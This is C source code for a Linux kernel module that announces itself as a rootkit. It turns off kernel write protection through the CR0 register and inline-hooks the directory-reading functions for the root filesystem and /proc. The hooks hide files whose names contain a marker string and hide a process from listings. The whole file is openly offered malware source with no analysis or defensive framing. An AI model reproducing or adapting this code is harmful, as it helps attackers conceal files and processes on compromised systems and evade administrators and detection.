#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_fs.h>

#if defined(__i386__)
#define csize 6
#define jacked_code "\x68\x00\x00\x00\x00\xc3" /*push addr, ret*/
#define poff 1 /*offset to start writing addresses*/
#else
#define csize 12
#define jacked_code "\x48\x8b\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0" /*mov rax, [addr], jmp rax*/
#define poff 2 /*offset to start writing addresses*/
#endif
//replaces my hijacked code with normal code.
unsigned char origCodeRoot[csize];
unsigned char jackedCodeRoot[csize];
void *targetRoot;
unsigned char origCodeProc[csize];
unsigned char jackedCodeProc[csize];
void *targetProc;


MODULE_LICENSE("GPL");
int hatedKit_init(void);
void hatedKit_exit(void);
module_init(hatedKit_init);
module_exit(hatedKit_exit);

static int (*rootedInReading)(struct file *file, void *dirent, filldir_t filldir);
static int (*procuredReading)(struct file *file, void *dirent, filldir_t filldir);
static int (*o_root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);
static int (*o_proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);

void jack_it(void *target, const char *indicator){
	if (strcmp("root", indicator) == 0){
		barrier();
		write_cr0(read_cr0() & (~0x10000));
		memcpy(target, jackedCodeRoot, csize);
		write_cr0(read_cr0() | 0x10000);
		barrier();
	}

	if (strcmp("proc", indicator) == 0){
		barrier();
		write_cr0(read_cr0() & (~0x10000));
		memcpy(target, jackedCodeProc, csize);
		write_cr0(read_cr0() | 0x10000);
		barrier();
	}

}


void fix_it(void *target, const char *indicator){
	if (strcmp("root", indicator) == 0){
		barrier();
		write_cr0(read_cr0() & (~0x10000));
		memcpy(target, origCodeRoot, csize);
		write_cr0(read_cr0() | 0x10000);
		barrier();
	}

	if (strcmp("proc", indicator) == 0){
		barrier();
		write_cr0(read_cr0() & (~0x10000));
		memcpy(target, origCodeProc, csize);
		write_cr0(read_cr0() | 0x10000);
		barrier();
	}
}


void save_it(void *target, void *new, const char *indicator) {
	unsigned char hijack_code[csize];
	unsigned char o_code[csize];

	memcpy(hijack_code, jacked_code, csize);
	*(unsigned long *)&hijack_code[poff] = (unsigned long)new;
	memcpy(o_code, target, csize);

	printk("hijack_code");
	printk("o_code");

	if (strcmp("root", indicator) == 0){
		memcpy(origCodeRoot, o_code, csize);
		targetRoot = target;
		memcpy(jackedCodeRoot, hijack_code, csize);
	}

	if (strcmp("proc", indicator) == 0){
		memcpy(origCodeProc, o_code, csize);
		targetProc = target;
		memcpy(jackedCodeProc, hijack_code, csize);
	}
}

static int rooty_root_filldir(void *__buff, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type){
	char *get_protect = "hatefulPractice";

	if (strstr(name, get_protect)){
		return 0;
	}

	return o_root_filldir(__buff, name, namelen, offset, ino, d_type);
}

static int rooty_root_readdir(struct file *file, void *dirent, filldir_t filldir){
	int ret;
	o_root_filldir = filldir;

	fix_it(rootedInReading, "root");
	ret = rootedInReading(file, dirent, &rooty_root_filldir);
	jack_it(rootedInReading, "root");

	return ret;
}

static int rooty_proc_filldir(void *__buff, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type){
	long pid;
	char *endp;
	long my_pid = 1;
	unsigned short base = 10;

	pid = simple_strtol(name, &endp, base);
	if (my_pid == pid){
		return 0;
	}

	return o_proc_filldir(__buff, name, namelen, offset, ino, d_type);
}

static int rooty_proc_readdir(struct file *file, void *dirent, filldir_t filldir){
	int ret;
	o_root_filldir = filldir;

	fix_it(procuredReading, "proc");
	ret = procuredReading(file, dirent, &rooty_proc_filldir);
	jack_it(procuredReading, "proc");

	return ret;
}


int hatedKit_init(void){

	struct file *theRootOfAllFiles = filp_open("/", O_RDONLY, 0);
	if (theRootOfAllFiles == NULL){
		return 1;
	}
	rootedInReading = theRootOfAllFiles->f_op->readdir;
	filp_close(theRootOfAllFiles, 0);
	save_it(rootedInReading, rooty_root_readdir, "root");
	jack_it(rootedInReading, "root");

	struct file *procuringTheDirectory = filp_open("/proc", O_RDONLY, 0);
        if (procuringTheDirectory == NULL){
                return 1;
        }
        procuredReading = procuringTheDirectory->f_op->readdir;
	filp_close(procuringTheDirectory, 0);

	save_it(procuredReading, rooty_proc_readdir, "proc");
	jack_it(procuredReading, "proc");


	printk("This rootkit has been loaded\n");
	return 0;
}

void hatedKit_exit(void){
	fix_it(rootedInReading, "root");
	fix_it(procuredReading, "proc");
	printk("This rootkit has been removed\n");
}

